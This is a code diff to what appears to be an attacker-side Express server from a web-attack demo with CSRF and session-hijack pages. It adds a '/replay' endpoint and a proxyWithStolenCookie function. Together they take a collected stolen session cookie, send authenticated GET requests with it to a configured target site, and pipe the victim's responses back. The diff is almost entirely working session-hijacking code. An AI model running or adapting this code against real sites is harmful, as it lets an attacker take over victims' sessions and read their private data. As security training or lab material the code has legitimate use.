@@ -1,5 +1,7 @@
 const fs = require("fs");
 const path = require("path");
+const http = require("http");
+const https = require("https");
 const express = require("express");
 const morgan = require("morgan");
 
@@ -47,6 +49,33 @@ function createApp(options) {
     });
   }
 
+  function normalizeReplayPath(inputPath) {
+    const replayPath = String(inputPath || "/orders");
+    if (replayPath.charAt(0) !== "/") {
+      return null;
+    }
+    return replayPath;
+  }
+
+  function proxyWithStolenCookie(replayPath, callback) {
+    const targetUrl = new URL(config.targetBase);
+    const transport = targetUrl.protocol === "https:" ? https : http;
+    const requestOptions = {
+      protocol: targetUrl.protocol,
+      hostname: targetUrl.hostname,
+      port: targetUrl.port || (targetUrl.protocol === "https:" ? 443 : 80),
+      path: replayPath,
+      method: "GET",
+      headers: {
+        cookie: config.state.lastStolenCookie
+      }
+    };
+
+    const req = transport.request(requestOptions, callback);
+    req.on("error", callback);
+    req.end();
+  }
+
   app.get("/csrf", (req, res) => {
     res.setHeader("content-type", "text/html; charset=utf-8");
     res.send(render("csrf.html"));
@@ -70,6 +99,31 @@ function createApp(options) {
   app.get("/session-hijack", (req, res) => {
     res.setHeader("content-type", "text/html; charset=utf-8");
     res.send(render("session_hijack.html"));
+  });
+
+  app.get("/replay", (req, res) => {
+    const replayPath = normalizeReplayPath(req.query.path);
+    if (!config.state.lastStolenCookie) {
+      return res.status(400).send("No stolen cookie collected yet");
+    }
+    if (!replayPath) {
+      return res.status(400).send("Invalid replay path");
+    }
+
+    proxyWithStolenCookie(replayPath, (upstream) => {
+      if (upstream instanceof Error) {
+        if (!res.headersSent) {
+          res.status(502).send("Replay failed");
+        }
+        return;
+      }
+
+      res.status(upstream.statusCode || 200);
+      if (upstream.headers["content-type"]) {
+        res.setHeader("content-type", upstream.headers["content-type"]);
+      }
+      upstream.pipe(res);
+    });
   });
 
   app.locals.config = config;
